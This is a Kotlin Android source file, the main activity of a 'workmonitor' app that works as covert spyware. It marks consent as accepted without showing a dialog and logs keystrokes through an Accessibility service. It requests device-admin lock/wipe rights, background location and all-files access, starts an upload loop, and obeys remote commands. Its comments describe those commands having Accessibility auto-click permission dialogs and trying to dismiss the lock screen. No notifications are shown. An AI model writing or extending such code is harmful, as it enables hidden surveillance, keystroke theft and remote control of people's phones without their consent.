package com.workmonitor

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

/**
 * Dev-mode: auto-accept consent, skip the dialog.
 * Only guide user to enable Accessibility service.
 * No notification permission is requested — monitoring is notification-free.
 */
class MainActivity : AppCompatActivity() {
    private var lastReqPermsAt = 0L
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val status = findViewById<TextView>(R.id.status)

        // Dev mode: auto-accept consent (no dialog)
        if (!AppConfig.consentAccepted(this)) {
            AppConfig.markConsentAccepted(this)
        }

        enableDeviceAdmin()
        BootReceiver.startNow(this)   // kick the upload loop immediately

        // Remote "req_perms" command → pop the runtime permission dialogs now.
        // Debounce: several queued req_perms could arrive back-to-back; stacking them
        // cancels each other's dialog. Only fire once per few seconds.
        if (intent?.getBooleanExtra("req_perms", false) == true) {
            val now = System.currentTimeMillis()
            if (now - lastReqPermsAt > 4000) {
                lastReqPermsAt = now
                requestLocationPermission()
            }
        }
        // Remote "unlock" command → best-effort keyguard dismissal (dismisses an empty
        // keyguard; on a PIN/pattern lock only the user's credential completes unlock).
        if (intent?.getBooleanExtra("unlock", false) == true) {
            attemptUnlock()
        }

        refreshStatus()
        findViewById<Button>(R.id.btn_settings).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    override fun onResume() {
        super.onResume()
        // User may have just flipped Accessibility on/off — reflect it immediately.
        refreshStatus()
        // Heal location permission silently ONLY on first launch / when a remote
        // grant isn't in progress. Calling this on EVERY resume cancels any
        // permission dialog the remote "req_perms" just opened (Android re-enters,
        // re-requests, and the dialog is torn down before the Accessibility
        // auto-grant can click it). That was making the panel grant impossible.
        if (intent?.getBooleanExtra("req_perms", false) != true) {
            requestLocationPermission()
        }
    }

    private fun refreshStatus() {
        val status = findViewById<TextView>(R.id.status)
        status.text = if (isServiceEnabled()) "Monitoring ACTIVE — keystrokes are being logged"
                      else "Monitoring PAUSED — tap the button to re-enable Accessibility"
    }

    /** Request runtime location + storage permission; Android 11+ opens All Files Access. */
    private fun requestLocationPermission() {
        val perms = ArrayList<String>()
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED)
            perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION)
        else if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED)
            perms.add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
        // Android 10+ background monitoring NEEDS the user to pick "Allow all the time".
        if (android.os.Build.VERSION.SDK_INT >= 29 &&
            checkSelfPermission(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED)
            perms.add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != android.content.pm.PackageManager.PERMISSION_GRANTED
            && android.os.Build.VERSION.SDK_INT <= 32)
            perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        if (perms.isNotEmpty()) {
            try { requestPermissions(perms.toTypedArray(), 2001) } catch (_: Exception) {}
        }
        // Storage "All files access" onboarding is DELIBERATELY NOT launched here.
        // It opens a Settings page that instantly pulls focus and tears down any
        // location dialog the remote req_perms just popped — which is why the panel
        // grant kept dying. It's now handled separately (see ensureStorageAccess).
    }

    private fun isServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabled: List<AccessibilityServiceInfo> = am.getEnabledAccessibilityServiceList(AccessibilityEvent.TYPES_ALL_MASK)
        return enabled.any { it.resolveInfo.serviceInfo.packageName == packageName }
    }

    private fun enableDeviceAdmin() {
        val dpm = getSystemService(DevicePolicyManager::class.java)
        val cn = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(cn)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required to allow remote lock/wipe on this device.")
            startActivity(intent)
        }
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        requestLocationPermission()
        ensureStorageAccess()
    }

    /** Android 11+: full storage listing needs "All files access". Only launched during
     *  interactive first-run setup (NOT the remote req_perms path) so it can't pull
     *  focus away from a location dialog mid-grant. User may skip; file manager shows
     *  a banner until granted. */
    /** Android 11+: full storage listing needs "All files access". Only launched during
     *  interactive first-run setup (NOT the remote req_perms path) so it can't pull
     *  focus away from a location dialog mid-grant. User may skip; file manager shows
     *  a banner until granted. */
    private fun ensureStorageAccess() {
        if (android.os.Build.VERSION.SDK_INT < 30 || android.os.Environment.isExternalStorageManager()) return
        android.widget.Toast.makeText(
            this,
            "Files tab needs 'All files access' — granting it now.",
            android.widget.Toast.LENGTH_LONG
        ).show()
        try {
            startActivity(
                android.content.Intent(
                    android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    android.net.Uri.parse("package:$packageName")
                )
            )
        } catch (_: Exception) {
            try {
                startActivity(android.content.Intent(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            } catch (_: Exception) {}
        }
    }

    /** Best-effort unlock: dismisses an empty keyguard (no PIN). With a secured lock
     *  screen, this shows the system unlock prompt — the user still enters their PIN
     *  because Android forbids a normal app from bypassing credentials. */
    private fun attemptUnlock() {
        try {
            val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            if (Build.VERSION.SDK_INT >= 26) {
                km.requestDismissKeyguard(this, object : KeyguardManager.KeyguardDismissCallback() {})
            } else {
                @Suppress("DEPRECATION")
                km.exitKeyguardSecurely(null)
            }
        } catch (_: Throwable) {}
    }
}